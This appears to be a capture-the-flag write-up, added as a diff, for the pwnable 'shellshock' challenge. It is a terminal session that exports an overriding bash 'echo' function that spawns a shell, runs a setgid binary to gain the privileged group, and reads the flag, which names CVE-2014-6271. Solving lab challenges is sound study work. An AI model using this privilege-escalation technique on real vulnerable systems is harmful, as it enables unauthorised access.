@@ -1,0 +1,25 @@
+shellshock
+==========
+
+shellshock@pwnable:~$ ls -al
+total 980
+drwxr-x---   5 root shellshock       4096 Oct 23  2016 .
+drwxr-xr-x 116 root root             4096 Nov 12 21:34 ..
+-r-xr-xr-x   1 root shellshock     959120 Oct 12  2014 bash
+d---------   2 root root             4096 Oct 12  2014 .bash_history
+-r--r-----   1 root shellshock_pwn     47 Oct 12  2014 flag
+dr-xr-xr-x   2 root root             4096 Oct 12  2014 .irssi
+drwxr-xr-x   2 root root             4096 Oct 23  2016 .pwntools-cache
+-r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock
+-r--r--r--   1 root root              188 Oct 12  2014 shellshock.c
+shellshock@pwnable:~$ ./bash
+shellshock@pwnable:~$ echo(){ /usr/bin/id; /bin/bash; }
+shellshock@pwnable:~$ export -f echo
+shellshock@pwnable:~$ ./shellshock
+uid=1019(shellshock) gid=1020(shellshock_pwn) groups=1020(shellshock_pwn),1019(shellshock)
+shellshock@pwnable:~$ id
+uid=1019(shellshock) gid=1020(shellshock_pwn) groups=1020(shellshock_pwn),1019(shellshock)
+shellshock@pwnable:~$ cat ./flag
+only if I knew CVE-2014-6271 ten years ago..!!
+shellshock@pwnable:~$
+
